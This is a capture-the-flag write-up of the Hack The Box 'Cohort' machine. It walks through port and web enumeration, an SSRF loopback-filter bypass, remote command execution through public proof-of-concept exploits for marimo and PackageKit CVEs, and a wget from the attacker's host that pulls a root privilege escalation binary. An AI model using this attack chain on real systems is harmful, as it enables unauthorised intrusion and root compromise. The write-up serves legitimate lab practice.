# Cohort Linux Easy HTB Machine Writeup

## NMAP Emuneration
```bash
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp  open  http     nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://cohort.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
443/tcp open  ssl/http nginx 1.24.0 (Ubuntu)
| ssl-cert: Subject: commonName=cohort.htb/organizationName=Cohort Analytics
| Subject Alternative Name: DNS:cohort.htb, DNS:*.cohort.htb
| Issuer: commonName=cohort.htb/organizationName=Cohort Analytics
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-06-01T18:47:07
| Not valid after:  2126-05-08T18:47:07
| MD5:     2e50 cc1d 45e6 73fd 12c5 9e21 82f2 c0ae
| SHA-1:   7e85 23e7 63eb 6541 a236 a388 fdc5 2514 8ca9 8e8c
|_SHA-256: b5a8 18c7 eb3c 1923 8381 2665 afcb 2e69 85e7 b6f4 84e2 5378 205d b746 e58c b39f
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://cohort.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## Web Emuneration
```bash
┌──(jameskaois㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/dirb/common.txt -u https://cohort.htb/FUZZ -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://cohort.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

api                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 212ms]
assets                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 331ms]
status                  [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 796ms]
:: Progress: [4616/4616] :: Job [1/1] :: 201 req/sec :: Duration: [0:00:31] :: Errors: 0 ::
                                                                                                                                   
┌──(jameskaois㉿kali)-[~]
└─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://cohort.htb -H "Host: FUZZ.cohort.htb" -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cohort.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.cohort.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

:: Progress: [19966/19966] :: Job [1/1] :: 145 req/sec :: Duration: [0:02:04] :: Errors: 0 ::
```
From the home page itself, found the route `POST /api/validate`:
```bash
await fetch("https://cohort.htb/api/validate", {
    "credentials": "omit",
    "headers": {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
        "Accept": "application/json",
        "Accept-Language": "en-US,en;q=0.5",
        "Content-Type": "application/json",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Priority": "u=0"
    },
    "referrer": "https://cohort.htb/portal.html",
    "body": "{\"url\":\"http://127.0.0.1\",\"format\":\"csv\"}",
    "method": "POST",
    "mode": "cors"
});
```
Got:
```json
{"ok": false, "message": "Internal or loopback addresses are not permitted."}
```
Tried other variants:
```
http://localhost
```
This one works:
```
http://0.0.0
```
Got:
```json
{"ok": true, "fetched_status": 200, "content_type": "text/html", "preview": "<!doctype html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>Cohort Analytics</title>\n<meta name=\"description\" content=\"Cohort Analytics - retention intelligence for subscription teams.\">\n<link rel=\"stylesheet\" href=\"/assets/styles.css\">\n</head>\n<body>\n<div id=\"app\" data-page=\"home\" aria-busy=\"true\">\n  <div class=\"boot\"><span class=\"boot-mark\" aria-hidden=\"true\"></span><span>Loading Cohort Analytics</span></div>\n</div>\n<noscript>\n  <div style=\"max-width:640px;margin:18vh auto;padding:0 24px;font-family:system-ui,sans-serif;color:#15181d;text-align:center;\">\n    <h1 style=\"font-size:1.4rem;\">JavaScript required</h1>\n    <p style=\"color:#4a5159;\">The Cohort Analytics workspace runs in your browser. Please enable JavaScript to continue.</p>\n  </div>\n</noscript>\n<script src=\"/assets/app.js\" defer></script>\n</body>\n</html>\n", "message": "Source reachable."}
```
The website is a Client-end side rendering app, tried other routes:
```
http://0.0.0/status

{"ok": true, "fetched_status": 200, "content_type": "application/json", "preview": "{\"service\":\"cohort-edge\",\"status\":\"ok\",\"generated_by\":\"nginx\",\"upstreams\":[{\"name\":\"marketing\",\"host\":\"cohort.htb\",\"root\":\"/var/www/cohort\"},{\"name\":\"insights-api\",\"host\":\"cohort.htb\",\"path\":\"/api/\",\"target\":\"127.0.0.1:5000\"},{\"name\":\"notebooks\",\"host\":\"nb-1be3782a8afd3ad5.cohort.htb\",\"target\":\"127.0.0.1:8888\",\"note\":\"internal analyst workspace, not for external use\"}]}", "message": "Source reachable."}
```
From this found another subdomain `nb-1be3782a8afd3ad5.cohort.htb`
Visit `http://nb-1be3782a8afd3ad5.cohort.htb` get redirected to `http://nb-1be3782a8afd3ad5.cohort.htb/auth/login` which requires Access Token/Password
```bash
┌──(jameskaois㉿kali)-[~]
└─$ whatweb http://nb-1be3782a8afd3ad5.cohort.htb/auth/login
http://nb-1be3782a8afd3ad5.cohort.htb/auth/login [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.129.24.196], RedirectLocation[https://nb-1be3782a8afd3ad5.cohort.htb/auth/login], Title[301 Moved Permanently], nginx[1.24.0]
https://nb-1be3782a8afd3ad5.cohort.htb/auth/login [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.129.24.196], PasswordField[password], Title[marimo], UncommonHeaders[x-content-type-options], X-Frame-Options[DENY], nginx[1.24.0]
```
Search for `marimo notebook vulnerabilities` found **CVE-2026-39987**
## Get user flag
Found this [POC](https://github.com/jasonbernier/CVE-2026-39987)
```bash
┌──(jameskaois㉿kali)-[~/Documents]
└─$ python exploit.py -u https://nb-1be3782a8afd3ad5.cohort.htb -c "id"             


[+] Connecting to wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws...
[+] Executing: id

[+] Output:
id
uid=1000(marimo) gid=1000(marimo) groups=1000(marimo)
marimo@cohort:~$ 
```
Add `time.sleep(300)` to keep the reverse shell works:
```bash
marimo@cohort:~$ cat user.txt
e14ebd100d824e3304a38a204bac5658
```
## Privilege Escalation
```bash
marimo@cohort:/tmp$ dpkg -l | grep packagekit
ii  gir1.2-packagekitglib-1.0             1.2.8-2ubuntu1.5                                 amd64        GObject introspection data for the PackageKit GLib library
ii  libpackagekit-glib2-18:amd64          1.2.8-2ubuntu1.5                                 amd64        Library for accessing PackageKit using GLib
hi  packagekit                            1.2.8-2ubuntu1.2                                 amd64        Provides a package management service
ii  packagekit-tools                      1.2.8-2ubuntu1.2                                 amd64        Provides PackageKit command-line tools
marimo@cohort:/tmp$ 
```
Found the vulnerability ****CVE-2026-41651****
## Get root flag
[POC](https://github.com/Vozec/CVE-2026-41651)
```bash
┌──(jameskaois㉿kali)-[~/Documents]
└─$ wget https://raw.githubusercontent.com/Vozec/CVE-2026-41651/main/cve-2026-41651
--2026-08-04 17:25:36--  https://raw.githubusercontent.com/Vozec/CVE-2026-41651/main/cve-2026-41651
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.111.133, 185.199.108.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 27544 (27K) [application/octet-stream]
Saving to: ‘cve-2026-41651’

cve-2026-41651                   100%[=========================================================>]  26.90K  --.-KB/s    in 0.002s  

2026-08-04 17:25:42 (11.6 MB/s) - ‘cve-2026-41651’ saved [27544/27544]


┌──(jameskaois㉿kali)-[~/Documents]
└─$ file cve-2026-41651                                                           
cve-2026-41651: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=1e5e46702d83bd4418094c853c45a240e4e64326, for GNU/Linux 4.4.0, not stripped

┌──(jameskaois㉿kali)-[~/Documents]
└─$ python3 -m http.server 8080                                                                               
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.129.24.196 - - [04/Aug/2026 17:26:12] "GET /cve-2026-41651 HTTP/1.1" 200 -
```
Execute the script:
```bash
marimo@cohort:/tmp$ wget http://10.10.15.64:8080/cve-2026-41651
--2026-08-04 10:26:00--  http://10.10.15.64:8080/cve-2026-41651
Connecting to 10.10.15.64:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 27544 (27K) [application/octet-stream]
Saving to: ‘cve-2026-41651’

cve-2026-41651      100%[===================>]  26.90K  59.6KB/s    in 0.5s    

2026-08-04 10:26:02 (59.6 KB/s) - ‘cve-2026-41651’ saved [27544/27544]

marimo@cohort:/tmp$ chmod +x cve-2026-41651 
marimo@cohort:/tmp$ ./cve-2026-41651 
═══════════════════════════════════════════════════
 CVE-2026-41651 — PackageKit TOCTOU LPE
═══════════════════════════════════════════════════
[*] Building packages (pure C)...
[+] dummy   : /tmp/.pk-dummy-2414.deb
[+] payload : /tmp/.pk-payload-2414.deb
[*] Transaction : /2_aecaceea
[*] Step 1 : InstallFiles(SIMULATE=0x4, dummy) [async]
[*] Step 2 : InstallFiles(NONE=0x0, payload) [async]
[*] Waiting for dispatch (30 s max)...
[!] PK error 48: Failed to obtain authentication.
[*] Finished (exit=2, 0 ms)
[*] Loop ran for 39 ms
[*] Polling for payload (120 s max)...
[*] t+1s: payload=exists dpkg_lock=free suid=not yet
[*] t+2s: payload=exists dpkg_lock=free suid=not yet

[+] SUCCESS — SUID bash at t+1300ms
uid=1000(marimo) gid=1000(marimo) euid=0(root) groups=1000(marimo)
.suid_bash: cannot set terminal process group (-1): Inappropriate ioctl for device
.suid_bash: no job control in this shell
.suid_bash-5.2# id
uid=1000(marimo) gid=1000(marimo) euid=0(root) groups=1000(marimo)
.suid_bash-5.2# cat /root/root.txt
0794bca7235b3edd8375e30bbfa9902d
.suid_bash-5.2# 
```